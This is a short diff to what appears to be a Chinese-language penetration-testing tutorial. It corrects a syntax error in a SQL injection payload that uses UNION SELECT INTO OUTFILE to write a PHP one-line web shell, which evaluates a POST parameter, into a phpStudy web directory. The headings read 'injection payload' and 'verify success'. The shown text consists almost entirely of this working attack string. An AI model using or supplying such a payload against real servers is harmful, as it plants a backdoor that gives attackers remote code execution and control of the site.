@@ -15,7 +15,7 @@
 **注入payload**
 
 ```shell
-' union select '<?php @eval($_POST["jaden"] ?>',1 into outfile "C:\\phpStudy\\PHPTutorial\\WWW\\mm.php"#
+' union select '<?php @eval($_POST["jaden"]) ?>',1 into outfile "C:\\phpStudy\\PHPTutorial\\WWW\\mm.php"#
 ```
 
 **验证是否成功**
